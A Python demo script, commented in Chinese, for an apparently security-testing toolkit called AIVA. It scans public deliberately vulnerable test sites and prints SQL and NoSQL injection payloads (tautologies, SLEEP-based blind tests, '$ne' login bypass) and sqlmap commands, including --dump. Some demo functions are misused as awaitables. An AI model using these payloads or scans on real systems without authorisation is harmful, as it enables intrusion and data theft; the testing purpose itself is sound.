#!/usr/bin/env python3
"""
AIVA SQL Injection Tools Demo - Task 12
演示 SQL 注入工具集成的各項功能
"""

import asyncio
import json
import sys
from pathlib import Path
from typing import Dict, Any

# 添加項目根目錄到 Python 路徑
project_root = Path(__file__).resolve().parent.parent.parent.parent
sys.path.insert(0, str(project_root))

from services.integration.capability.sql_injection_tools import (
    SQLTarget, SQLInjectionManager, SQLInjectionCLI, SQLInjectionCapability
)
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text


console = Console()


async def demo_basic_sql_injection_scan():
    """演示基本 SQL 注入掃描"""
    console.print("\n[bold blue]1. 基本 SQL 注入掃描演示[/bold blue]")
    
    manager = SQLInjectionManager()
    
    # 使用測試目標
    test_targets = [
        "http://testphp.vulnweb.com/artists.php?artist=1",
        "http://demo.testfire.net/search.aspx?query=test",
        "http://www.itsecgames.com/sqli/index.php?id=1"
    ]
    
    for target_url in test_targets:
        console.print(f"\n[yellow]掃描目標: {target_url}[/yellow]")
        
        try:
            # 使用自定義掃描器進行快速掃描
            target = manager._parse_target(target_url, {})
            results = await manager.custom_scanner.scan_target(target)
            
            if results:
                console.print("[green]✓ 發現潛在 SQL 注入漏洞![/green]")
                for result in results[:2]:  # 只顯示前兩個結果
                    console.print(f"  - 參數: {result.parameter}")
                    console.print(f"  - 類型: {result.injection_type}")
                    console.print(f"  - 嚴重性: {result.severity}")
                    console.print(f"  - 信心度: {result.confidence}%")
                    console.print()
            else:
                console.print("[dim]未發現明顯的 SQL 注入漏洞[/dim]")
                
        except Exception as e:
            console.print(f"[red]掃描錯誤: {str(e)}[/red]")


def demo_payload_testing():
    """演示載荷測試功能"""
    console.print("\n[bold blue]2. SQL 注入載荷測試演示[/bold blue]")
    
    scanner = CustomSQLInjectionScanner()
    
    # 顯示載荷類型
    payload_types = ["error_based", "boolean_based", "time_based", "union_based"]
    
    table = Table(title="SQL 注入載荷類型")
    table.add_column("類型", style="cyan")
    table.add_column("數量", justify="right", style="magenta")
    table.add_column("示例載荷", style="green")
    
    for payload_type in payload_types:
        payloads = scanner.payloads.get(payload_type, [])
        example = payloads[0] if payloads else "無"
        if len(example) > 50:
            example = example[:47] + "..."
        
        table.add_row(
            payload_type.replace("_", " ").title(),
            str(len(payloads)),
            example
        )
    
    console.print(table)
    
    # 演示載荷分析邏輯
    console.print("\n[yellow]載荷分析演示:[/yellow]")
    
    # 錯誤基礎載荷測試
    error_content = "mysql_fetch_array() expects parameter 1 to be resource"
    baseline = {'response_time': 0.1, 'content_length': 100}
    
    result = scanner._analyze_response(
        error_content, 200, 0.2, "error_based", baseline,
        "http://example.com", "id", "' OR '1'='1"
    )
    
    if result:
        console.print(f"[green]✓ 檢測到錯誤基礎注入: {result.evidence}[/green]")
    
    # 時間基礎載荷測試
    time_result = scanner._analyze_response(
        "Normal response", 200, 5.5, "time_based", baseline,
        "http://example.com", "id", "' OR SLEEP(5)--"
    )
    
    if time_result:
        console.print(f"[green]✓ 檢測到時間基礎注入: 響應時間 {time_result.response_time}s[/green]")


def demo_nosql_injection():
    """演示 NoSQL 注入檢測"""
    console.print("\n[bold blue]3. NoSQL 注入檢測演示[/bold blue]")
    
    from services.integration.capability.sql_injection_tools import NoSQLInjectionScanner
    
    # 顯示 NoSQL 載荷
    console.print("[yellow]NoSQL 注入載荷示例:[/yellow]")
    
    nosql_examples = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "this.username == \'admin\'"}',
        'true, true',
        '1\' || \'1\'==\'1',
        '{"$regex": ".*"}'
    ]
    
    for i, payload in enumerate(nosql_examples, 1):
        console.print(f"  {i}. {payload}")
    
    # 模擬 NoSQL 注入測試
    console.print("\n[yellow]模擬 NoSQL 注入測試:[/yellow]")
    
    target = SQLTarget(
        url="http://example.com/api/login",
        method="POST",
        data='{"username": "admin", "password": "test"}'
    )
    
    console.print(f"目標: {target.url}")
    console.print(f"原始數據: {target.data}")
    
    # 模擬繞過載荷
    bypass_payload = '{"username": {"$ne": null}, "password": {"$ne": null}}'
    console.print(f"繞過載荷: {bypass_payload}")
    console.print("[green]✓ 此載荷可能繞過身份驗證檢查[/green]")


def demo_blind_injection_detection():
    """演示盲注檢測"""
    console.print("\n[bold blue]4. 盲注檢測演示[/bold blue]")
    
    # 演示盲注檢測邏輯
    console.print("[yellow]盲注檢測原理:[/yellow]")
    
    # 時間盲注
    console.print("\n[cyan]時間盲注檢測:[/cyan]")
    console.print("1. 發送正常請求測量基準響應時間")
    console.print("2. 發送延遲載荷 (如 SLEEP(5))")
    console.print("3. 比較響應時間差異")
    console.print("4. 如果響應時間明顯增加，則可能存在時間盲注")
    
    # 布林盲注  
    console.print("\n[cyan]布林盲注檢測:[/cyan]")
    console.print("1. 發送真條件載荷 (如 1' AND '1'='1)")
    console.print("2. 發送假條件載荷 (如 1' AND '1'='2)")
    console.print("3. 比較兩次響應的內容長度和內容")
    console.print("4. 如果響應明顯不同，則可能存在布林盲注")
    
    # 模擬檢測結果
    console.print("\n[yellow]模擬檢測結果:[/yellow]")
    
    detection_table = Table(title="盲注檢測結果")
    detection_table.add_column("載荷類型", style="cyan")
    detection_table.add_column("測試載荷", style="yellow")
    detection_table.add_column("響應時間", style="magenta")
    detection_table.add_column("檢測結果", style="green")
    
    # 時間盲注示例
    detection_table.add_row(
        "時間盲注",
        "1' AND SLEEP(5)--",
        "5.2s",
        "✓ 可能存在"
    )
    
    # 布林盲注示例
    detection_table.add_row(
        "布林盲注 (真)",
        "1' AND '1'='1--",
        "0.1s (1024 bytes)",
        "✓ 正常響應"
    )
    
    detection_table.add_row(
        "布林盲注 (假)",
        "1' AND '1'='2--",
        "0.1s (156 bytes)",
        "✓ 不同響應"
    )
    
    console.print(detection_table)


async def demo_comprehensive_scan():
    """演示綜合掃描功能"""
    console.print("\n[bold blue]5. 綜合掃描演示[/bold blue]")
    
    manager = SQLInjectionManager()
    
    # 模擬綜合掃描結果
    console.print("[yellow]正在執行綜合掃描...[/yellow]")
    
    scan_methods = [
        ("Sqlmap 掃描", "專業 SQL 注入工具"),
        ("自定義掃描", "多種載荷類型測試"),
        ("NoSQL 注入掃描", "NoSQL 數據庫注入檢測"),
        ("盲注掃描", "時間和布林盲注檢測")
    ]
    
    for method, description in scan_methods:
        console.print(f"  ➤ {method}: {description}")
    
    # 創建模擬掃描結果
    mock_results = {
        'target': 'http://example.com/test.php?id=1',
        'timestamp': '2024-01-15 10:30:00',
        'sqlmap_results': [],
        'custom_scan_results': [
            {
                'parameter': 'id',
                'injection_type': 'Error-based SQL Injection',
                'severity': 'High',
                'confidence': 85,
                'payload': "1' OR '1'='1--"
            }
        ],
        'nosql_results': [],
        'blind_injection_results': [
            {
                'parameter': 'id',
                'injection_type': 'Time-based Blind SQL Injection',
                'severity': 'High',
                'confidence': 80,
                'payload': "1' AND SLEEP(5)--"
            }
        ],
        'summary': {
            'total_vulnerabilities': 2,
            'high_vulnerabilities': 2,
            'medium_vulnerabilities': 0,
            'low_vulnerabilities': 0,
            'scan_methods': {
                'sqlmap': 0,
                'custom_scan': 1,
                'nosql_scan': 0,
                'blind_injection': 1
            }
        }
    }
    
    # 顯示掃描摘要
    summary_table = Table(title="掃描結果摘要")
    summary_table.add_column("項目", style="cyan")
    summary_table.add_column("數量", justify="right", style="magenta")
    
    summary = mock_results['summary']
    summary_table.add_row("總漏洞數", str(summary['total_vulnerabilities']))
    summary_table.add_row("高危漏洞", str(summary['high_vulnerabilities']))
    summary_table.add_row("中危漏洞", str(summary['medium_vulnerabilities']))
    summary_table.add_row("低危漏洞", str(summary['low_vulnerabilities']))
    
    console.print(summary_table)
    
    # 顯示詳細結果
    if mock_results['custom_scan_results']:
        console.print("\n[green]發現的漏洞詳情:[/green]")
        for i, result in enumerate(mock_results['custom_scan_results'], 1):
            console.print(f"  {i}. {result['injection_type']}")
            console.print(f"     參數: {result['parameter']}")
            console.print(f"     載荷: {result['payload']}")
            console.print(f"     嚴重性: {result['severity']}")
            console.print(f"     信心度: {result['confidence']}%")
            console.print()


async def demo_sqlmap_integration():
    """演示 Sqlmap 整合"""
    console.print("\n[bold blue]6. Sqlmap 整合演示[/bold blue]")
    
    sqlmap = SqlmapIntegration()
    
    console.print("[yellow]Sqlmap 整合特性:[/yellow]")
    features = [
        "自動下載和安裝 Sqlmap",
        "智能參數檢測",
        "多種數據庫支持 (MySQL, PostgreSQL, MSSQL, Oracle等)",
        "高級注入技術 (時間盲注, 布林盲注, UNION查詢等)",
        "自動化漏洞利用",
        "詳細的漏洞報告"
    ]
    
    for feature in features:
        console.print(f"  ✓ {feature}")
    
    # 檢查 Sqlmap 狀態
    console.print(f"\n[yellow]Sqlmap 路徑檢查:[/yellow]")
    sqlmap_path = sqlmap._find_sqlmap_path()
    
    if sqlmap_path:
        console.print(f"[green]✓ 找到 Sqlmap: {sqlmap_path}[/green]")
    else:
        console.print("[yellow]⚠ 未找到 Sqlmap，需要安裝[/yellow]")
        console.print("  執行 'python -m pip install sqlmap' 或從官方下載")
    
    # 模擬 Sqlmap 掃描命令
    console.print(f"\n[yellow]示例 Sqlmap 命令:[/yellow]")
    example_commands = [
        "sqlmap -u 'http://example.com/test.php?id=1' --batch",
        "sqlmap -u 'http://example.com/login.php' --data 'user=admin&pass=test' --batch",
        "sqlmap -u 'http://example.com/test.php?id=1' --dbs --batch",
        "sqlmap -u 'http://example.com/test.php?id=1' --dump --batch"
    ]
    
    for cmd in example_commands:
        console.print(f"  $ {cmd}")


async def demo_cli_interface():
    """演示 CLI 界面"""
    console.print("\n[bold blue]7. CLI 界面演示[/bold blue]")
    
    console.print("[yellow]SQL 注入工具 CLI 功能:[/yellow]")
    
    cli_features = [
        "1. 綜合 SQL 注入掃描",
        "2. 自定義掃描配置",
        "3. NoSQL 注入檢測",
        "4. 盲注專項掃描",
        "5. Sqlmap 整合掃描",
        "6. 掃描結果管理",
        "7. 載荷庫管理",
        "8. 目標管理",
        "9. 報告生成",
        "0. 退出"
    ]
    
    for feature in cli_features:
        console.print(f"  {feature}")
    
    console.print("\n[green]CLI 特色功能:[/green]")
    console.print("  ✓ 豐富的交互式界面")
    console.print("  ✓ 彩色輸出和進度顯示")
    console.print("  ✓ 詳細的掃描報告")
    console.print("  ✓ 多種輸出格式 (JSON, HTML, CSV)")
    console.print("  ✓ 掃描歷史記錄")


async def demo_capability_integration():
    """演示能力整合"""
    console.print("\n[bold blue]8. AIVA 能力整合演示[/bold blue]")
    
    capability = SQLInjectionCapability()
    
    # 初始化能力
    console.print("[yellow]正在初始化 SQL 注入能力...[/yellow]")
    init_result = await capability.initialize()
    
    if init_result:
        console.print("[green]✓ 能力初始化成功[/green]")
    else:
        console.print("[red]✗ 能力初始化失敗[/red]")
        return
    
    # 顯示能力信息
    info_table = Table(title="SQL 注入能力信息")
    info_table.add_column("屬性", style="cyan")
    info_table.add_column("值", style="green")
    
    info_table.add_row("名稱", capability.name)
    info_table.add_row("版本", capability.version)
    info_table.add_row("描述", capability.description)
    info_table.add_row("依賴數量", str(len(capability.dependencies)))
    
    console.print(info_table)
    
    # 演示能力執行
    console.print("\n[yellow]可用命令:[/yellow]")
    commands = [
        ("comprehensive_scan", "執行綜合 SQL 注入掃描"),
        ("custom_scan", "執行自定義載荷掃描"),
        ("nosql_scan", "執行 NoSQL 注入掃描"),
        ("blind_scan", "執行盲注專項掃描"),
        ("sqlmap_scan", "執行 Sqlmap 掃描")
    ]
    
    for cmd, desc in commands:
        console.print(f"  • {cmd}: {desc}")
    
    # 模擬命令執行
    console.print(f"\n[yellow]模擬執行命令示例:[/yellow]")
    
    # 由於是演示，我們不執行實際的網絡掃描
    mock_result = {
        'success': True,
        'data': {
            'target': 'http://example.com',
            'summary': {
                'total_vulnerabilities': 1,
                'high_vulnerabilities': 1,
                'scan_methods': {
                    'custom_scan': 1
                }
            }
        }
    }
    
    console.print(f"命令: comprehensive_scan")
    console.print(f"參數: {{'target_url': 'http://example.com'}}")
    console.print(f"結果: [green]成功 - 發現 {mock_result['data']['summary']['total_vulnerabilities']} 個漏洞[/green]")
    
    # 清理能力
    await capability.cleanup()
    console.print("\n[green]✓ 能力清理完成[/green]")


async def run_interactive_demo():
    """運行交互式演示"""
    console.print(Panel.fit(
        "[bold blue]AIVA SQL Injection Tools Demo[/bold blue]\n"
        "[yellow]SQL 注入工具集成演示[/yellow]",
        border_style="blue"
    ))
    
    demos = [
        ("基本 SQL 注入掃描", demo_basic_sql_injection_scan),
        ("載荷測試功能", demo_payload_testing),
        ("NoSQL 注入檢測", demo_nosql_injection),
        ("盲注檢測", demo_blind_injection_detection),
        ("綜合掃描功能", demo_comprehensive_scan),
        ("Sqlmap 整合", demo_sqlmap_integration),
        ("CLI 界面", demo_cli_interface),
        ("AIVA 能力整合", demo_capability_integration)
    ]
    
    while True:
        console.print("\n[bold cyan]請選擇演示項目:[/bold cyan]")
        
        for i, (name, _) in enumerate(demos, 1):
            console.print(f"  {i}. {name}")
        
        console.print("  9. 運行所有演示")
        console.print("  0. 退出")
        
        try:
            choice = console.input("\n[yellow]請輸入選項 (0-9): [/yellow]")
            
            if choice == "0":
                console.print("[green]感謝使用 AIVA SQL 注入工具演示！[/green]")
                break
            elif choice == "9":
                console.print("\n[bold green]運行所有演示...[/bold green]")
                for name, demo_func in demos:
                    console.print(f"\n{'='*60}")
                    console.print(f"[bold yellow]正在運行: {name}[/bold yellow]")
                    console.print('='*60)
                    await demo_func()
                    
                    # 等待用戶確認繼續
                    console.input("\n[dim]按 Enter 繼續下一個演示...[/dim]")
                
                console.print("\n[bold green]所有演示已完成！[/bold green]")
                break
            elif choice.isdigit() and 1 <= int(choice) <= len(demos):
                idx = int(choice) - 1
                name, demo_func = demos[idx]
                
                console.print(f"\n{'='*60}")
                console.print(f"[bold yellow]正在運行: {name}[/bold yellow]")
                console.print('='*60)
                
                await demo_func()
                
                console.input("\n[dim]按 Enter 返回主選單...[/dim]")
            else:
                console.print("[red]無效選項，請重新選擇[/red]")
                
        except KeyboardInterrupt:
            console.print("\n[yellow]演示已中斷[/yellow]")
            break
        except Exception as e:
            console.print(f"[red]運行演示時發生錯誤: {str(e)}[/red]")


async def main():
    """主函數"""
    try:
        await run_interactive_demo()
    except Exception as e:
        console.print(f"[red]演示程序錯誤: {str(e)}[/red]")
        return 1
    
    return 0


if __name__ == "__main__":
    # 需要導入的模組（防止導入錯誤）
    try:
        from services.integration.capability.sql_injection_tools import (
            CustomSQLInjectionScanner, SqlmapIntegration
        )
    except ImportError as e:
        console.print(f"[red]導入錯誤: {str(e)}[/red]")
        console.print("[yellow]請確保在 AIVA 項目根目錄下運行此演示[/yellow]")
        sys.exit(1)
    
    # 運行演示
    exit_code = asyncio.run(main())
    sys.exit(exit_code)